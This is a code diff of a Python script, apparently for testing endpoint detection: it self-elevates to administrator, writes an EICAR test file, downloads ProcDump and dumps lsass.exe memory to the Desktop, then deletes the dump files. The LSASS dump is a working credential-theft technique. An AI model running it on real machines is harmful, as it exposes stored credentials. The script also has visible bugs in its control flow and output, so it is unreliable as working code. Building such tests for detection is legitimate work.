@@ -5,68 +5,102 @@ from zipfile import ZipFile
 import shutil
 import sys
 import ctypes
+from colorama import init as colorama_init
+from colorama import Fore
+from colorama import Style
 
+colorama_init()
+
+
+def is_admin():
+    """Returns True if script is running with administrator privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    """Relaunch the script with admin privileges and keep the output visible."""
+    script = os.path.abspath(sys.argv[0])  # Get absolute path of the script
+    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])  # Properly format arguments
+    python_exe = sys.executable  # Gets the correct Python interpreter
+
+    # Relaunch using cmd.exe so the window stays open
+    cmd = f'start cmd /k "{python_exe} \"{script}\" {params}"'
+    
+    # Use ShellExecute to elevate privileges
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {cmd}", None, 1)
+    
+    sys.exit()
+
+if not is_admin():
+    print(f"{Fore.RED}[!]{Style.RESET_ALL} Relaunching as {Fore.RED}Admin{Style.RESET_ALL}...\n")
+    run_as_admin()
+
+print(f"{Fore.LIGHTGREEN_EX}[*]{Style.RESET_ALL} Running with {Fore.RED}Administrator{Style.RESET_ALL} privileges...\n")
 
 #CS_PATH = r"C:\Windows\System32\drivers\CrowdStrike"
 
 
 class EPScenario:
-    def __init__(self, ps, cmd, baseDir):
+    def __init__(self, ps, path):
         self.PS = ps
-        self.CMD = cmd
-        self.baseDir = baseDir
-
-
-    def _get_user(self):
-        _user = sp.check_output([PS, "-Command", "whoami"], text=True)
-        user_lst = _user.split('\\')
-        temp = user_lst[1]
-        cleaned_user = temp.replace("\n", "")
-        return cleaned_user
+        self.path = path
     
     def make_Eicar(self):
-        # Generate EICAR file
+        """ 
+        Generate EICAR file on user Desktop
+        """
+
+        eicar_file = os.path.join(f"{self.path}", "EICAR.txt")
         try:
-            user = self._get_user()
-            sleep(2)
-            os.chdir(f"C:\\Users\\{user}\\OneDrive\\Desktop") # Remove OneDrive before push
+
+            os.chdir(f"{self.path}")
                 # EICAR file not recognized as malicious by Windows? May need to execute file.
-            with open("EICAR.txt", "w") as f:
+                # Need to test on lab endpoint
+
+            with open(eicar_file, "w") as f:
                 f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
-            print(f"File created: EICAR.txt")
+            files = [os.path.join(self.path, f) for f in os.listdir(self.path) if "eicar" in f.lower()]
+            if files:
+                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} File created: EICAR.txt!\n\n")
+            
 
         except FileNotFoundError as e:
-            print("Path not found.\n")
-            path = input("Enter path manually:\n")
+            print("{Fore.RED}[-]{Style.RESET_ALL} Path not found.\n")
+            path = input(f"{Fore.RED}[*]{Style.RESET_ALL} Enter path manually:\n")
             os.chdir(path=path)
 
-            with open("EICAR.txt", "w") as f:
+            with open(eicar_file, "w") as f:
                 f.write(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
 
     def cs_alerts(self):
-        sp.check_output([self.CMD, "-Command", ])
+        sp.check_output(["cmd.exe", "-Command", ])
         # Generate CrowdStrike alerts via cmd in proj-notes.txt
         pass
 
     def _dump_setup(self):
-        os.makedirs(self.baseDir + "ProcDump", exist_ok=True)
-        os.makedirs(self.baseDir + "Dump", exist_ok=True)
-        return self.baseDir + "ProcDump"
+        """
+        Make relevant directories -> easier cleanup
+        """
+
+        os.makedirs(self.path + "ProcDump", exist_ok=True)
+        os.makedirs(self.path + "Dump", exist_ok=True)
+
+        return self.path + "ProcDump"
 
     
     def _check_cleaned(self):
-        
-        files_to_delete = files_to_delete = [os.path.join(self.baseDir, f) for f in os.listdir(self.baseDir) if "dump" in f.lower()]
-    
+        """
+         Checks if files were deleted after calling dump_lsass method.
+        """
+
         # Collect matching filenames
-        # for filename in os.listdir(dir):
-        #     if "dump" in filename.lower():  # More efficient than regex here
-        #         files_to_delete.append(os.path.join(dir, filename))  # Full path
-        #     else:
-        #         print("[-] No dump files!\n")
-        #         return False
+        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if "dump" in f.lower()]
+    
+        
         if not files_to_delete:
-            print("No files to delete!\n")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} No files to delete!\n")
             return False
         
         sf_file = False
@@ -78,14 +112,14 @@ class EPScenario:
                 try:
                     if os.path.isdir(file):  
                         shutil.rmtree(file, ignore_errors=True)  # Delete directory
-                        print(f"[+] Deleted directory: {file}\n")
+                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted directory: {file}\n")
                         sf_dir = True
                     elif os.path.isfile(file):  
                         os.remove(file)  # Delete file
-                        print(f"[+] Deleted file: {file}\n")
+                        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Deleted file: {file}\n")
                         sf_file = True
                 except PermissionError as e:
-                    print(f"[!] Permission denied: {file} - {e}\n")
+                    print(f"{Fore.RED}[!] Permission denied: {file} - {e}{Style.RESET_ALL}\n")
         else:
             return True
     
@@ -94,35 +128,33 @@ class EPScenario:
         path = self._dump_setup() # Path-To-Desktop\\ProcDump
         procZip = "Procdump.zip"
 
-        sp.run([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.baseDir}Procdump.zip"""] ,shell=True, text=True)
-        joined_path = self.baseDir+procZip
-    
+        # Download Procdump
+        sp.run([PS, "-Command", f"""Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -OutFile {self.path}Procdump.zip"""] ,shell=True, text=True)
+        joined_path = self.path+procZip
+
+        # Unzip file
         with ZipFile(joined_path, "r") as procObject:
             procObject.extractall(path=path)
-        sleep (2)
- #       try:
-        args = f"""Start-Process -FilePath '{path}\\procdump64.exe' -ArgumentList '-accepteula -ma lsass.exe {self.baseDir}\\Dump\\lsass.dmp' -Verb RunAs"""
-        sp.run([PS, "-Command", args], shell=True, text=True)
 
-        # sp.call([PS, "-Command", r"""-ArgumentList @({}\\ .\procdump64.exe -accepteula -ma lsass.exe {}Dump\\lsass.dmp)) -Verb RunAs""".format(path, self.baseDir)], shell=True , text=True)
-        
-        print("Initialized ProcDump in Dump directory!\n")
-        print(f"Lsass.dmp created at: {self.baseDir}\\Dump..\nStarting cleanup.....\n")
+        sleep(2)
 
-        cleaned_success = self._check_cleaned()
+        # Run command
+        try:    
+            args = f'"{path}\\procdump64.exe" -accepteula -ma lsass.exe "{self.path}\\Dump\\lsass.dmp"'
+            sp.run(["cmd.exe", "/c", args], shell=True, text=True)
 
-        if cleaned_success:
-                print("Cleaning done!\n")
-        else:
-            print("Cleaning files failed!\n")
-        # except PermissionError as e:
-        #     print("Execution failed.\nCleaning up..\n")
-        #     if self._check_cleaned():
-        #         print("Cleaned.\n")
-        #         os.listdir(self.baseDir)
+        # Handle error
+        except PermissionError as e:
+            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Initialized ProcDump in Dump directory!\n")
+            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump..\nStarting cleanup.....\n")
 
+            cleaned_success = self._check_cleaned()
 
-        # Use procdump (sysInternals) to dump lsass.exe
+            if cleaned_success:
+                    print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Cleaning done!\n")
+            else:
+                print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")
+
 
     def _check_S_solutions(self):
         # Check whether Cisco AMP, Symantec, or CrowdStrike is present on the EP.
@@ -136,34 +168,14 @@ class EPScenario:
         # Check default browser, 
         pass
 
-def is_admin():
-    """Returns True if script is running with administrator privileges."""
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
 
 if __name__ == '__main__':
     PS = os.path.expandvars(r"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe")
-    CMD = os.path.expandvars(r"%SystemRoot%\system32\cmd.exe")
     
-    if not is_admin():
-        print("[!] Relaunching with Admin privileges...")
-        script = os.path.abspath(sys.argv[0])  # Get absolute path
-        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])  # Properly format arguments
-
-        # Ensure Python executable is used correctly
-        python_exe = sys.executable  # Gets the correct Python interpreter
-
-        # Relaunch with admin privileges
-        sp.run([
-            "powershell", "-Command",
-            f"Start-Process -FilePath '{python_exe}' -ArgumentList '{script} {params}' -Verb RunAs"
-            ])
-        sys.exit()
-
-    print("[*] Running with Administrator privileges.")
     desktopPath = os.path.expandvars(r"%USERPROFILE%\Desktop\\")
-    EP_obj1 = EPScenario(ps=PS, cmd=CMD, baseDir=desktopPath)
-    EP_obj1.dump_lsass()
+    EP_obj = EPScenario(ps=PS, path=desktopPath)
+    EP_obj.make_Eicar()
+    EP_obj.dump_lsass()
+
+    if input("Press any key to exit...\n"):
+        sys.exit(0)
